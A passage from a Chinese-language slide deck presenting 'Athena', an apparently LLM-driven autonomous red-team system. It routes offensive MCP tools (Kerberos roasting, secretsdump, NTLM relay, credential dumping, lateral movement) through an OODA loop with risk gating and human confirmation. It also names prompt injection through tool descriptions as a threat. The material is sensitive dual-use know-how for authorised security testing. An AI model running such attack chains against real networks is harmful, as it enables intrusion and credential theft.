<div class="slide-eyebrow">// MCP / TOOLS · Page 11</div>
<div class="slide-h1">武器庫 — 17 個 MCP 工具的分工</div>

<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; margin-top: 1.6rem;">

<div style="border: 1px solid var(--border); border-left: 3px solid var(--accent-green); padding: 1rem 1.2rem; background: var(--bg-elev); border-radius: 4px;">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.85rem; font-weight: 700; letter-spacing: 0.1em;">▌ RECON</div>
<div class="cmd-list" style="margin-top: 0.6rem; font-size: 0.92rem;">
<div class="cmd-row">› <code>nmap-scanner</code></div>
<div class="cmd-row">› <code>web-scanner</code></div>
<div class="cmd-row">› <code>vuln-lookup</code></div>
</div>
</div>

<div style="border: 1px solid var(--border); border-left: 3px solid var(--accent-orange); padding: 1rem 1.2rem; background: var(--bg-elev); border-radius: 4px;">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-orange); font-size: 0.85rem; font-weight: 700; letter-spacing: 0.1em;">▌ EXPLOIT</div>
<div class="cmd-list" style="margin-top: 0.6rem; font-size: 0.92rem;">
<div class="cmd-row">› <code>credential-checker</code></div>
<div class="cmd-row">› <code>attack-executor</code></div>
<div class="cmd-row">› <code>privesc-scanner</code></div>
</div>
</div>

<div style="border: 1px solid var(--border); border-left: 3px solid var(--accent-red); padding: 1rem 1.2rem; background: var(--bg-elev); border-radius: 4px;">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-red); font-size: 0.85rem; font-weight: 700; letter-spacing: 0.1em;">▌ AD ATTACK</div>
<div class="cmd-list" style="margin-top: 0.6rem; font-size: 0.92rem;">
<div class="cmd-row">› <code>impacket-ad</code></div>
<div class="cmd-row">› <code>certipy-ad</code></div>
<div class="cmd-row">› <code>hashcat-crack</code></div>
</div>
</div>

<div style="border: 1px solid var(--border); border-left: 3px solid var(--accent-red); padding: 1rem 1.2rem; background: var(--bg-elev); border-radius: 4px;">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-red); font-size: 0.85rem; font-weight: 700; letter-spacing: 0.1em;">▌ POST-EX</div>
<div class="cmd-list" style="margin-top: 0.6rem; font-size: 0.92rem;">
<div class="cmd-row">› <code>netexec-suite</code></div>
<div class="cmd-row">› <code>lateral-mover</code></div>
<div class="cmd-row">› <code>credential-dumper</code></div>
</div>
</div>

<div style="border: 1px solid var(--border); border-left: 3px solid var(--accent-green); padding: 1rem 1.2rem; background: var(--bg-elev); border-radius: 4px;">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.85rem; font-weight: 700; letter-spacing: 0.1em;">▌ ENUM</div>
<div class="cmd-list" style="margin-top: 0.6rem; font-size: 0.92rem;">
<div class="cmd-row">› <code>bloodhound-collector</code></div>
<div class="cmd-row">› <code>responder-capture</code></div>
<div class="cmd-row">› <code>ntlm-relay</code></div>
</div>
</div>

<div style="border: 1px solid var(--border); border-left: 3px solid var(--fg-dim); padding: 1rem 1.2rem; background: var(--bg-elev); border-radius: 4px;">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--fg-dim); font-size: 0.85rem; font-weight: 700; letter-spacing: 0.1em;">▌ MISC</div>
<div class="cmd-list" style="margin-top: 0.6rem; font-size: 0.92rem;">
<div class="cmd-row">› <code>api-fuzzer</code></div>
<div class="cmd-row">› <code>msf-rpc</code></div>
</div>
</div>

</div>

<div class="bridge-bottom" style="font-style: italic;">
17 個工具今天好用 — 但明天新環境怎麼辦？下一張 →
</div>

---
transition: fade
---

<!-- Slide 19 from Harry's PPT — 從 hardcoded dict 到動態路由 -->

<div class="slide-eyebrow">// ROUTING / NEW · Page 12</div>
<div class="slide-h1">從 hardcoded dict 到動態路由</div>

<div class="compare-2" style="margin-top: 1.4rem;">

<div class="side red-border">
<div class="head" style="font-family: 'JetBrains Mono', monospace; color: var(--accent-red); font-size: 0.85rem; letter-spacing: 0.1em;">● ● ●  舊：hardcoded dict（10 行）</div>

```python
# legacy: hardcoded mapping
_AD_TECHNIQUE_TO_MCP = {
  "T1558.004": "impacket-ad:asrep_roast",
  "T1649":     "certipy-ad:certipy_request",
  "T1003.003": "impacket-ad:secretsdump",
  "T1110.002": "hashcat-crack:run",
  # ... 還有十幾條
}
tool = _AD_TECHNIQUE_TO_MCP[tid]
# 新環境 → 改 dict、改程式碼、重 deploy
```

</div>

<div class="center">→</div>

<div class="side green-border">
<div class="head" style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.85rem; letter-spacing: 0.1em;">● ● ●  新：動態路由（3 行）</div>

```python
# new: LLM picks the tool itself
orient_resp = llm_orient(facts)
tool        = orient_resp["mcp_tool"]
engine_router.dispatch(tool, args)
# 新環境 → 加新的 MCP server
# Orient 自動發現 + 自動使用
```

</div>

</div>

<div class="bridge-bottom" style="font-style: italic;">
動態路由很爽 — 但 LLM 怎麼知道用哪個工具？最後一張 →
</div>

---
transition: fade
---

<!-- Slide 20 from Harry's PPT — Schema 是介面，也是 sandbox -->

<div class="slide-eyebrow">// ROUTING / SCHEMA · Page 12b</div>
<div class="slide-h1">Schema 是介面，也是 sandbox</div>

<div class="numbered-lines" style="margin-top: 1.6rem;">

<div class="numbered-line">
<div class="n">01</div>
<div class="body">
<div style="font-size: 1.2rem; font-weight: 700;"><code>tools/list</code> 回傳的 schema</div>
<div style="font-size: 0.95rem; color: var(--fg); margin-top: 0.4rem; line-height: 1.7;">每個 server 暴露 <code>name / description / inputSchema / risk / noise_cost</code>；LLM 啟動時抓一次。</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.82rem; margin-top: 0.3rem; background: var(--bg-elev); padding: 0.4rem 0.6rem; border-radius: 3px;">{"name":"asrep_roast","risk":"low","noise_cost":2,"input":{"users":"string[]"}}</div>
</div>
</div>

<div class="numbered-line">
<div class="n">02</div>
<div class="body">
<div style="font-size: 1.2rem; font-weight: 700;">選錯工具的 fallback</div>
<div style="font-size: 0.95rem; color: var(--fg); margin-top: 0.4rem; line-height: 1.7;"><code>engine_router</code> 驗 <code>args schema</code>；不合 → 回 Orient 重選；連續 2 次失敗 → 標記 <code>dead_end</code>，後續 OODA 不再推。</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem;"><code>dead_end facts</code> 寫回 DB，影響 <code>history_success_rate</code></div>
</div>
</div>

<div class="numbered-line">
<div class="n">03</div>
<div class="body">
<div style="font-size: 1.2rem; font-weight: 700;">Prompt injection via MCP description</div>
<div style="font-size: 0.95rem; color: var(--fg); margin-top: 0.4rem; line-height: 1.7;">tool description 進入 LLM context 即攻擊面。Athena 對所有 description 做 allowlist。</div>
<div style="font-size: 0.85rem; color: var(--accent-orange); margin-top: 0.3rem;">純 ASCII / 無祈使句 / 長度 ≤ 200 — 違規 server 即拒絕載入</div>
</div>
</div>

</div>

<div class="bridge-bottom" style="font-style: italic;">
架構講完了 — 接下來把它跑成五個動作循環 →
</div>

---
transition: fade
---

<!-- Slide 21 from Harry's PPT — Ch4 Framework · Chapter divider (作戰準則 — 五個動作循環) -->

<div class="deco-squares tl"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>
<div class="deco-squares br"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>

<div style="height: 100%; display: grid; grid-template-columns: 1fr 1.4fr; align-items: center; gap: 3rem; padding: 0 4rem;">

<div style="font-family: 'JetBrains Mono', monospace; font-size: clamp(8rem, 18vw, 14rem); font-weight: 700; color: var(--accent-green, #3FB950); line-height: 1; letter-spacing: -0.03em;">
04
</div>

<div>

<div class="slide-eyebrow">// CHAPTER 04 :: FRAMEWORK</div>

<div class="slide-h1" style="font-size: 2.4rem; line-height: 1.2;">
作戰準則 — 五個動作循環
</div>

<div style="width: 4rem; height: 3px; background: var(--accent-green, #3FB950); margin: 1.4rem 0;"></div>

<div style="color: var(--fg); font-size: 1.05rem; line-height: 1.7;">
OODA × C5ISR — 兩個框架接成一張表。<br/>
四個動作 × 各自失敗模式 × 自我修復路徑。
</div>

<div style="margin-top: 1.4rem; color: var(--accent-green, #3FB950); font-weight: 700; font-size: 1.05rem; line-height: 1.6;">
最後落到 TEMPO — 30× 為什麼是維度差。
</div>

</div>

</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 22 from Harry's PPT — Ch4 Framework · Why fuse OODA + C5ISR -->

<div class="slide-eyebrow">DOCTRINE / FRAMEWORK · Page 13</div>
<div class="slide-h1">為什麼把 OODA 跟 C5ISR 接在一起</div>
<div class="slide-sub" style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">
OODA = 決策節奏 · C5ISR = 體系能力
</div>

<div class="compare-2" style="margin-top: 1.4rem;">

<div class="side green-border">
<div class="head" style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-dim); letter-spacing: 0.1em;">OODA</div>
<div style="font-size: 1.4rem; font-weight: 700; color: var(--fg); margin: 0.3rem 0 0.9rem 0;">迴圈：節奏與速度</div>
<div class="body" style="font-size: 0.85rem; line-height: 1.6;">
由 John Boyd 從空戰經驗萃取<br/>
<code>Observe → Orient → Decide → Act</code><br/><br/>
<strong>▌ 強調的是「轉得多快」</strong><br/>
誰能更快完成一輪迴圈，誰就掌握主導權。<br/><br/>
<strong>▌ 但 OODA 沒回答：</strong><br/>
每一步要看什麼資料、要呼叫什麼能力、要怎麼下達指令。
</div>
</div>

<div class="center" style="color: var(--accent-amber);">×</div>

<div class="side" style="border-left: 3px solid var(--accent-amber);">
<div class="head" style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-dim); letter-spacing: 0.1em;">C5ISR</div>
<div style="font-size: 1.4rem; font-weight: 700; color: var(--fg); margin: 0.3rem 0 0.9rem 0;">體系：能力與分工</div>
<div class="body" style="font-size: 0.85rem; line-height: 1.6;">
美軍從 C2 演化而來的作戰 doctrine<br/>
Command · Control · Communications · Computers · Cyber · Intelligence · Surveillance · Reconnaissance<br/><br/>
<strong>▌ 強調的是「具備什麼能力」</strong><br/>
情報、指揮、通訊、執行……每一塊都有專責元件。<br/><br/>
<strong>▌ 但 C5ISR 沒回答：</strong><br/>
這些能力要在什麼時刻、以什麼順序串起來。
</div>
</div>

</div>

<div class="bridge-bottom">
<strong>Athena 的設計</strong>：把 OODA 的四步當骨架，把 C5ISR 的八項能力填進去 — 兩個框架在同一個地方說同一件事。
<div style="font-size: 0.78rem; color: var(--fg-dim); margin-top: 0.4rem;">接下來四頁，逐項拆解 Observe / Orient / Decide / Act 對應到哪些 C5ISR 能力。</div>
</div>

---
transition: fade
---

<!-- Slide 23 from Harry's PPT — Ch4 Framework · Observe ↔ Recon + Surveillance -->

<div class="slide-eyebrow">DOCTRINE / OBSERVE · Page 14</div>
<div class="slide-h1" style="color: var(--accent-green, #3FB950);">Observe ─ Reconnaissance + Surveillance</div>
<div class="slide-sub" style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">
OODA Observe ↔ C5ISR Reconnaissance + Surveillance
</div>

<div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-green, #3FB950); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.12em; color: var(--fg-dim);">RECONNAISSANCE</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-green, #3FB950);">01</div>
</div>
<div style="font-size: 1.15rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">主動偵察</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
<strong>▌ 軍事意義</strong><br/>
主動派出單位、深入敵境，取得當下的特定情報。<br/><br/>
<strong>▌ Athena 對應</strong><br/>
<code>nmap-scanner</code><br/>
<code>web-scanner</code><br/>
<code>bloodhound-collector</code><br/>
<code>credential-checker</code><br/><br/>
<strong>▌ 特性</strong><br/>
一次性、針對性、接觸目標、有曝露風險。
</div>
</div>

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-amber); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.12em; color: var(--fg-dim);">SURVEILLANCE</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-amber);">02</div>
</div>
<div style="font-size: 1.15rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">持續監視</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
<strong>▌ 軍事意義</strong><br/>
長期、廣域、被動接收，累積態勢全景。<br/><br/>
<strong>▌ Athena 對應</strong><br/>
<code>PostgreSQL Facts DB</code><br/>
<code>OPS LOG</code> 持續記錄<br/>
每輪 OODA 寫入新事實<br/>
後續迴圈讀回既有 facts<br/><br/>
<strong>▌ 特性</strong><br/>
持續累積、跨輪共享、不重複出工。
</div>
</div>

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-blue); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.12em; color: var(--fg-dim);">FACT SCHEMA</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-blue);">03</div>
</div>
<div style="font-size: 1.15rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">事實的格式</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
facts 寫入時都標準化為：<br/>
<code>category.subcategory</code><br/><br/>
例：<br/>
<code>service.open_port</code><br/>
<code>ad.user_no_preauth</code><br/>
<code>credential.nt_hash</code><br/>
<code>access.local_admin</code><br/><br/>
<strong>▌ 為何要分類</strong><br/>
Orient 階段 LLM 才能按類別檢索、不同 OODA 輪可以累加，不會互相覆蓋。
</div>
</div>

</div>

<div class="bridge-bottom">
<strong>Recon</strong> 出工去找新東西、<strong>Surveillance</strong> 把找到的東西收成資產 — 一次出擊變成累積戰力。
</div>

---
transition: fade
zoom: 0.9
---

<!-- Slide 24 from Harry's PPT — Ch4 Framework · Orient ↔ Intelligence + Command -->

<div class="slide-eyebrow">DOCTRINE / ORIENT · Page 15</div>
<div class="slide-h1" style="color: var(--accent-green, #3FB950);">Orient ─ Intelligence + Command</div>
<div class="slide-sub" style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">
OODA Orient ↔ C5ISR Intelligence + Command
</div>

<div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-green, #3FB950); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.12em; color: var(--fg-dim);">INTELLIGENCE</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-green, #3FB950);">01</div>
</div>
<div style="font-size: 1.05rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">輸入 / 8 SECTIONS</div>
<div style="font-size: 0.74rem; line-height: 1.55; color: var(--fg-dim);">
<strong>1.</strong> 行動簡報 — 目標、戰略意圖、風險門檻<br/>
<strong>2.</strong> 任務樹 — 已完成 / 待完成技術<br/>
<strong>3.</strong> Kill chain 位置 — 當前 tactic、下一階段<br/>
<strong>4.</strong> OODA 歷史 — 最近 N 輪 assessment<br/>
<strong>5.</strong> 前次評估 — 避免重推已失敗技術<br/>
<strong>6.</strong> 分類 facts — credential / service / access / ad<br/>
<strong>7.</strong> 可用技術 playbook — 含橫向移動機會<br/>
<strong>8.</strong> 可用 MCP 工具 — <code>ad_mcp_tools_summary</code>
</div>
</div>

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-amber); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.12em; color: var(--fg-dim);">COMMAND</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-amber);">02</div>
</div>
<div style="font-size: 1.05rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">輸出 / JSON</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
<code>situation_assessment</code><br/>
&nbsp;&nbsp;引用具體 facts 描述態勢<br/>
<code>recommended_technique_id</code><br/>
&nbsp;&nbsp;最優技術 ATT&CK ID<br/>
<code>confidence</code> — 0.0 – 1.0<br/>
<code>options [ 3 ]</code><br/>
&nbsp;&nbsp;<code>technique_id</code><br/>
&nbsp;&nbsp;<code>mcp_tool</code> (server:tool)<br/>
&nbsp;&nbsp;<code>reasoning</code> (引用 fact)<br/>
&nbsp;&nbsp;<code>risk_level</code><br/>
&nbsp;&nbsp;<code>prerequisites</code><br/><br/>
→ 不只給答案，還給判斷依據與備選。
</div>
</div>

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-blue); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.12em; color: var(--fg-dim);">DOCTRINE</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-blue);">03</div>
</div>
<div style="font-size: 1.05rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">判斷 / 四原則</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
<strong>▌ Kill chain 位置優先</strong><br/>
讀已執行 tactics → 推進到下一階段<br/><br/>
<strong>▌ Fact 驅動</strong><br/>
每個推薦必須引用 fact<br/>
<code>T1558.004 ← ad.user_no_preauth</code><br/><br/>
<strong>▌ 失敗記憶</strong><br/>
已敗技術不重推<br/><br/>
<strong>▌ 憑證優先</strong><br/>
有 <code>credential.*</code> 先利用，不重複收割路徑
</div>
</div>

</div>

<div class="bridge-bottom">
Boyd 說 <strong>Orient</strong> 是 OODA 靈魂；C5ISR 說 <strong>Intelligence</strong> 是體系核心 — 兩個框架在同一個地方說同一件事。
<div style="font-size: 0.78rem; color: var(--fg-dim); margin-top: 0.4rem; font-style: italic;">Orient 看著 fact，但會不會死循環推同一招？下一張 →</div>
</div>

---
transition: fade
---

<!-- Slide 25 from Harry's PPT — Ch4 Framework · Avoid retrying failed techniques -->

<div class="slide-eyebrow">DOCTRINE / ORIENT-DETAIL · Page 15b</div>
<div class="slide-h1">Orient 怎麼避免重推已敗技術</div>

<div class="numbered-lines" style="margin-top: 1.4rem; gap: 0.9rem;">

<div class="numbered-line" style="background: rgba(63,185,80,0.06); border: 1px solid rgba(63,185,80,0.2); border-radius: 6px; padding: 0.85rem 1.1rem; gap: 1.1rem; align-items: flex-start;">
<div class="n" style="color: var(--accent-green, #3FB950); font-size: 1.8rem; width: 1.8rem;">01</div>
<div class="body" style="font-size: 1rem; padding-top: 0.15rem;">
<strong>失敗 fact 的格式</strong><br/>
<span style="font-size: 0.88rem; color: var(--fg);">每次 <code>Decide=False</code> 或 <code>Act</code> 失敗，寫入 <code>attempt.failed</code> 並標 <code>technique_id + reason</code>。</span>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--fg-dim); margin-top: 0.4rem;">attempt.failed: T1003.001 / reason=edr_blocked / ts=...</div>
</div>
</div>

<div class="numbered-line" style="background: rgba(63,185,80,0.06); border: 1px solid rgba(63,185,80,0.2); border-radius: 6px; padding: 0.85rem 1.1rem; gap: 1.1rem; align-items: flex-start;">
<div class="n" style="color: var(--accent-green, #3FB950); font-size: 1.8rem; width: 1.8rem;">02</div>
<div class="body" style="font-size: 1rem; padding-top: 0.15rem;">
<strong>Orient prompt 注入歷史</strong><br/>
<span style="font-size: 0.88rem; color: var(--fg);">下一輪 Orient 把近 <code>N=20</code> 筆 <code>attempt.failed</code> 塞進 system context，明示「以下技術已失敗，勿重推」。</span>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--fg-dim); margin-top: 0.4rem;">blocked_techniques = [T1003.001, T1059.003, ...]</div>
</div>
</div>

<div class="numbered-line" style="background: rgba(63,185,80,0.06); border: 1px solid rgba(63,185,80,0.2); border-radius: 6px; padding: 0.85rem 1.1rem; gap: 1.1rem; align-items: flex-start;">
<div class="n" style="color: var(--accent-green, #3FB950); font-size: 1.8rem; width: 1.8rem;">03</div>
<div class="body" style="font-size: 1rem; padding-top: 0.15rem;">
<strong>等待 cooldown 後解禁</strong><br/>
<span style="font-size: 0.88rem; color: var(--fg);">失敗不是永久封禁 — 環境會變（EDR 更新、新憑證）。每筆 <code>attempt.failed</code> 帶 <code>cooldown=30min</code>，過後重新可選。</span>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--fg-dim); margin-top: 0.4rem;">rationale: prevent permanent dead-end on transient failures</div>
</div>
</div>

</div>

<div class="alert-box" style="font-style: italic; color: var(--accent-green, #3FB950); border-left-color: var(--accent-green, #3FB950); background: rgba(63,185,80,0.08);">
失敗記憶 + cooldown — 比人類紅隊的 Notion 筆記還精準
</div>

---
transition: fade
zoom: 0.95
---

<!-- Slide 26 from Harry's PPT — Ch4 Framework · Decide ↔ Control -->

<div class="slide-eyebrow">DOCTRINE / DECIDE · Page 16</div>
<div class="slide-h1" style="color: var(--accent-green, #3FB950);">Decide ─ Control</div>
<div class="slide-sub" style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">
OODA Decide ↔ C5ISR Control（執行控制 / 規則約束）
</div>

<div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-green, #3FB950); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.62rem; letter-spacing: 0.12em; color: var(--fg-dim);">COMPOSITE CONFIDENCE</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-green, #3FB950);">01</div>
</div>
<div style="font-size: 1.15rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">信心值合成</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
LLM 給出的單一 <code>confidence</code> 可能過度自信或過度保守。<br/><br/>
<strong>Athena 三因子合成：</strong>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--fg); background: var(--bg); padding: 0.5rem 0.6rem; border-radius: 3px; margin: 0.4rem 0; line-height: 1.5;">
composite =<br/>
&nbsp;&nbsp;&nbsp;LLM_confidence<br/>
&nbsp;× validation_score<br/>
&nbsp;× history_success_rate
</div>
<strong>▌</strong> 把當下判斷放進歷史與驗證的脈絡中重新加權。
</div>
</div>

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-amber); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.62rem; letter-spacing: 0.12em; color: var(--fg-dim);">RISK MATRIX</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-amber);">02</div>
</div>
<div style="font-size: 1.15rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">風險門檻矩陣</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
技術 × 噪音等級 → 是否自動執行
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--fg); background: var(--bg); padding: 0.5rem 0.6rem; border-radius: 3px; margin: 0.4rem 0; line-height: 1.5;">
risk ∈ { LOW, MEDIUM,<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HIGH, CRITICAL }<br/>
noise ∈ { silent, moderate,<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loud }<br/>
matrix(risk, noise) ⇒<br/>
&nbsp;&nbsp;auto_approved : bool
</div>
<strong>▌</strong> 越過門檻退回人工確認。<br/>
Athena 不是讓人離場，是讓人只在關鍵點介入。
</div>
</div>

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-blue); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.62rem; letter-spacing: 0.12em; color: var(--fg-dim);">NOISE BUDGET</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-blue);">03</div>
</div>
<div style="font-size: 1.15rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">噪音預算</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
每場行動有總預算（例：100）。每個動作都有 <code>noise_cost</code>。
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--fg); background: var(--bg); padding: 0.5rem 0.6rem; border-radius: 3px; margin: 0.4rem 0; line-height: 1.5;">
noise_budget −=<br/>
&nbsp;&nbsp;&nbsp;&nbsp;action.noise_cost
</div>
預算耗盡 → 行動自動停止。<br/><br/>
<strong>▌</strong> 軍事 doctrine 裡的「火力管制」與「資源節用」。<br/>
<strong>▌</strong> 防止 AI 過度自信、防止把 lab 跑成 DDoS。
</div>
</div>

</div>

<div class="bridge-bottom">
指揮官不靠感覺下令，靠的是量化的作戰評估 — 這是 <strong>Decide</strong> 跟 LLM 直覺最大的差別。
<div style="font-size: 0.78rem; color: var(--fg-dim); margin-top: 0.4rem; font-style: italic;">Decide 算完了 — 下一張：Act 怎麼跑、怎麼回收 →</div>
</div>

---
transition: fade
---

<!-- Slide 27 from Harry's PPT — Ch4 Framework · Act ↔ Computers + Cyber + Comms -->

<div class="slide-eyebrow">DOCTRINE / ACT · Page 17</div>
<div class="slide-h1" style="color: var(--accent-green, #3FB950); font-size: 1.7rem;">Act ─ Computers + Cyber + Communications</div>
<div class="slide-sub" style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">
OODA Act ↔ C5ISR Computers + Cyber + Communications
</div>

<div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-green, #3FB950); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.12em; color: var(--fg-dim);">COMPUTERS</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-green, #3FB950);">01</div>
</div>
<div style="font-size: 1.05rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">engine_router 派工</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
Decide 給出 <code>mcp_tool</code> 字串：
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: var(--fg); background: var(--bg); padding: 0.5rem 0.6rem; border-radius: 3px; margin: 0.4rem 0;">
"impacket-ad:asrep_roast"
</div>
<code>engine_router</code> 拆解：
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--fg); background: var(--bg); padding: 0.5rem 0.6rem; border-radius: 3px; margin: 0.4rem 0; line-height: 1.5;">
server = impacket-ad<br/>
tool&nbsp;&nbsp;&nbsp;= asrep_roast<br/>
args&nbsp;&nbsp;&nbsp;= orient.options[0].args
</div>
<strong>▌</strong> 透過 MCP 協定執行 — 不直接執行 OS 指令、全部走標準化介面、可重放、可審計。
</div>
</div>

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-amber); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.12em; color: var(--fg-dim);">CYBER</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-amber);">02</div>
</div>
<div style="font-size: 1.05rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">MCP 工具 = 武器庫</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
17 個 MCP server，分四群：
<div style="margin: 0.5rem 0; line-height: 1.65;">
<span style="font-family: 'JetBrains Mono', monospace; color: var(--accent-orange); font-size: 0.7rem; font-weight: 700;">RECON</span> &nbsp;&nbsp;&nbsp;&nbsp;網路 / 網頁 / 弱點<br/>
<span style="font-family: 'JetBrains Mono', monospace; color: var(--accent-red); font-size: 0.7rem; font-weight: 700;">EXPLOIT</span> &nbsp;&nbsp;驗證 / 執行 / 提權<br/>
<span style="font-family: 'JetBrains Mono', monospace; color: var(--accent-red); font-size: 0.7rem; font-weight: 700;">AD ATTACK</span> Kerberos / ADCS<br/>
